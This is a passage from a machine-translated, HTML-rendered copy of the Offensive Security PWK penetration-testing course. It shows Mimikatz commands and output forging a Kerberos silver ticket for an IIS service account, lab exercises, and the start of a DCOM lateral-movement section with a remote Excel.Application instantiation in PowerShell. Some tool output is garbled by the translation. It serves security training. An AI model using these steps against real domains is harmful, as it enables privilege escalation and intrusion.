<div style="position:absolute;top:55265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务类型 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/service:HTTP</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，以及 iis_service 服务帐户 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/rc4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">的密码哈希</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:55297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，生成的银票通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ppt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">直接注入内存</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:55330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在运行之前，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::purge</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">刷新所有现有的 Kerberos 票证</font><font style="vertical-align: inherit;">并验证</font></font></nobr></div>
<div style="position:absolute;top:55350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::list</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清除</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::清除</font></font></font></b></nobr></div>
<div style="position:absolute;top:55402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前会话的票证清除正常</font></font></nobr></div>
<div style="position:absolute;top:55435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::list</font></font></font></b></nobr></div>
<div style="position:absolute;top:55470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-278</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:55486;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748</font></font></b></nobr></div>
<div style="position:absolute;top:55503;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">290D87AA966C327 /ptt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：offsec</font></font></nobr></div>
<div style="position:absolute;top:55537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：corp.com (CORP)</font></font></nobr></div>
<div style="position:absolute;top:55554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SID : S-1-5-21-1602875587-2787523311-2599479668</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:55571;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户编号：500</font></font></b></nobr></div>
<div style="position:absolute;top:55588;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组 ID：\*513 512 520 518 519</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务密钥：e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt</font></font></nobr></div>
<div style="position:absolute;top:55622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务：HTTP</font></font></nobr></div>
<div style="position:absolute;top:55639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标 : CorpWebServer.corp.com</font></font></nobr></div>
<div style="position:absolute;top:55656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生命周期 : 13/02/2018 10.18.42 ; </font><font style="vertical-align: inherit;">11/02/2028 10.18.42 ; </font><font style="vertical-align: inherit;">11/02/2028 10.18.42</font></font></nobr></div>
<div style="position:absolute;top:55673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 门票：\*\* 传递门票 \*\*</font></font></nobr></div>
<div style="position:absolute;top:55707;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* PAC 生成</font></font></nobr></div>
<div style="position:absolute;top:55724;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* PAC 签名</font></font></nobr></div>
<div style="position:absolute;top:55741;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* EncTicketPart 生成</font></font></nobr></div>
<div style="position:absolute;top:55758;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* EncTicketPart 加密</font></font></nobr></div>
<div style="position:absolute;top:55775;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* KrbCred 生成</font></font></nobr></div>
<div style="position:absolute;top:55809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'offsec @ corp.com' 的金票成功提交当前会话</font></font></nobr></div>
<div style="position:absolute;top:55843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::list</font></font></font></b></nobr></div>
<div style="position:absolute;top:55877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000000] - 0x00000017 - rc4_hmac_nt </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:56011;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="48"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 48 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:56044;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:57121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:57121;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:57121;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">665</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:56140;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始/结束/MaxRenew: 13/02/2018 10.18.42 ; </font><font style="vertical-align: inherit;">11/02/2028 10.18.42 ; </font><font style="vertical-align: inherit;">11/02/2028 10.18.42</font></font></nobr></div>
<div style="position:absolute;top:56156;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器名称：HTTP/CorpWebServer.corp.com@corp.com</font></font></nobr></div>
<div style="position:absolute;top:56173;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户名称：offsec@corp.com</font></font></nobr></div>
<div style="position:absolute;top:56190;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志 40a00000 : pre_authent ; </font><font style="vertical-align: inherit;">可再生 ; </font><font style="vertical-align: inherit;">可转发；</font></font></nobr></div>
<div style="position:absolute;top:56210;left:260"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 709 - 为 iis_service 服务帐户创建银票</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 709 中的输出所示，SPN 的新服务票证</font></font></nobr></div>
<div style="position:absolute;top:56259;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/CorpWebServer.corp.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经加载到内存中并且 Mimikatz 设置了适当的组</font></font></nobr></div>
<div style="position:absolute;top:56278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伪造票证中的会员权限。</font><font style="vertical-align: inherit;">从 IIS 应用程序的角度来看，</font></font></nobr></div>
<div style="position:absolute;top:56297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前用户既是内置的本地管理员（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Relative Id: 500</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）又是几个的成员</font></font></nobr></div>
<div style="position:absolute;top:56317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高特权组，包括域管理员组（如上所述）。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56378;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建银票，我们使用密码哈希而不是明文</font></font></i></nobr></div>
<div style="position:absolute;top:56398;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码。</font><font style="vertical-align: inherit;">如果 kerberoast 会话向我们提供了明文密码，我们</font></font></i></nobr></div>
<div style="position:absolute;top:56417;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在使用它生成银票之前必须对其进行哈希处理。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经将这张票加载到内存中，我们可以与服务交互并获得访问权限</font></font></nobr></div>
<div style="position:absolute;top:56499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据我们放入银票的团体会员资格的任何信息。</font><font style="vertical-align: inherit;">取决于</font></font></nobr></div>
<div style="position:absolute;top:56518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型的服务，也有可能获得代码执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56552;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iis_service</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">账户</font><font style="vertical-align: inherit;">创建并注入一张</font><i><font style="vertical-align: inherit;">银票</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:56611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 如何在域管理员组中创建具有组成员身份的银票</font></font></nobr></div>
<div style="position:absolute;top:56630;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL 服务提供了一种在关联服务器上获得任意代码执行的方法吗？</font></font></nobr></div>
<div style="position:absolute;top:56659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 为 SQL 服务帐户创建一张银票。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56693;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.4</font></font></i></nobr></div>
<div style="position:absolute;top:56693;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分布式组件对象模型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将仔细研究一种相当新的横向运动技术，它利用了</font></font></nobr></div>
<div style="position:absolute;top:56750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分布式组件对象模型</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DCOM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">679</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56812;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有另外两种著名的横向运动技术值得一提：</font></font></i></nobr></div>
<div style="position:absolute;top:56832;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">滥用 Windows Management Instrumentation </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">680</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和一种称为</font></font></i></nobr></div>
<div style="position:absolute;top:56851;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 远程处理。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">681</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们不会在这里详细介绍这些方法，</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:57017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">679 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://msdn.microsoft.com/en-us/library/cc226801.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:57037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">680 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马特·格雷伯，2015 年），https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:57071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">681 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/aa384426 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:57199;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="49"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 49 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57232;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:58309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:58309;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:58309;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">666</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57328;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们有自己的优点和缺点以及多重</font></font></i></nobr></div>
<div style="position:absolute;top:57347;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">682</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Python 中的实现。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">683</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft 组件对象模型 (COM) 是一个用于创建软件组件的系统</font></font></nobr></div>
<div style="position:absolute;top:57429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">彼此互动。</font><font style="vertical-align: inherit;">虽然 COM 是为同进程或跨进程创建的</font></font></nobr></div>
<div style="position:absolute;top:57448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互，扩展到分布式组件对象模型（DCOM）进行交互</font></font></nobr></div>
<div style="position:absolute;top:57467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过网络在多台计算机之间。</font></font></nobr></div>
<div style="position:absolute;top:57500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">COM 和 DCOM 都是非常古老的技术，可以追溯到 Windows 的第一版。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">684</font></font></font></nobr></div>
<div style="position:absolute;top:57519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 DCOM 的交互通过 TCP 端口 135 上的 RPC 执行，本地管理员访问是</font></font></nobr></div>
<div style="position:absolute;top:57539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要调用 DCOM 服务控制管理器，它本质上是一个 API。</font></font></nobr></div>
<div style="position:absolute;top:57572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Microsoft Office 相关的 DCOM 对象允许横向移动，两者都通过使用</font></font></nobr></div>
<div style="position:absolute;top:57591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Outlook </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">685</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 PowerPoint。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">686</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为这需要 Microsoft Office 出现在</font></font></nobr></div>
<div style="position:absolute;top:57610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于目标计算机，这种横向移动技术最适合用于工作站。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:57629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的案例中，我们将在实验室中针对专用域控制器演示此攻击</font></font></nobr></div>
<div style="position:absolute;top:57649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已安装哪个 Office。</font><font style="vertical-align: inherit;">具体来说，我们将利用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Excel.Application</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> DCOM 对象。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">687</font></font></font></nobr></div>
<div style="position:absolute;top:57682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们可以利用 Microsoft Office 之前，我们必须在 Windows 10 学生虚拟机上安装它</font></font></nobr></div>
<div style="position:absolute;top:57701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和域控制器。</font><font style="vertical-align: inherit;">安装程序位于 C:\tools\client_side_attacks\Office2016.img</font></font></nobr></div>
<div style="position:absolute;top:57721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程与客户端攻击模块中执行的过程相同。</font></font></nobr></div>
<div style="position:absolute;top:57753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们必须首先使用以下方法发现此 DCOM 对象的可用方法或子对象</font></font></nobr></div>
<div style="position:absolute;top:57772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳。</font><font style="vertical-align: inherit;">对于此示例，我们以 jeff_admin 用户身份从 Windows 10 客户端进行操作，</font></font></nobr></div>
<div style="position:absolute;top:57792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程机器上的本地管理员。</font></font></nobr></div>
<div style="position:absolute;top:57825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此示例代码中，我们首先使用 PowerShell 和</font></font></nobr></div>
<div style="position:absolute;top:57844;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的CreateInstance</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">688</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Activator</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类。</font></font></nobr></div>
<div style="position:absolute;top:57877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateInstance</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的参数</font><font style="vertical-align: inherit;">，我们必须使用</font><i><font style="vertical-align: inherit;">GetTypeFromProgID</font></i><font style="vertical-align: inherit;">提供其类型</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:57896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">689</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定程序标识符（在本例中为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Excel.Application</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），以及</font></font></nobr></div>
<div style="position:absolute;top:57916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程工作站的 IP 地址。</font></font></nobr></div>
<div style="position:absolute;top:57948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例化对象后，我们可以使用</font><i><font style="vertical-align: inherit;">Get-</font></i><font style="vertical-align: inherit;">发现其可用的方法和对象</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:57968;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">690</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192</font></font></nobr></div>
<div style="position:absolute;top:58019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.168.1.110"))</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:58071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">682 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（威尔·施罗德，2016 年），http://www.harmj0y.net/blog/empire/expanding-your-empire/</font></font></font></nobr></div>
<div style="position:absolute;top:58091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">683 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（贾斯汀·埃尔兹，2015 年），https://www.trustedsec.com/2015/06/no_psexec_needed/</font></font></font></nobr></div>
<div style="position:absolute;top:58111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">684 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2018 年），https://en.wikipedia.org/wiki/Component_Object_Model</font></font></font></nobr></div>
<div style="position:absolute;top:58131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">685 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(@enigma0x3, 2017), https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dotnettojscript/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:58165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">686 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(@_nephalem_, 2018), https://attactics.org/2018/02/03/lateral-movement-with-powerpoint-and-dcom/</font></font></font></nobr></div>
<div style="position:absolute;top:58185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">687 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马特·纳尔逊，2017 年），https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/</font></font></font></nobr></div>
<div style="position:absolute;top:58205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">688 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/wccyzw83 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:58225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">689 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/etz83z76 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:58245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">690 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员？view=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:58387;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="50"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 50 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58420;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:59497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:59497;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
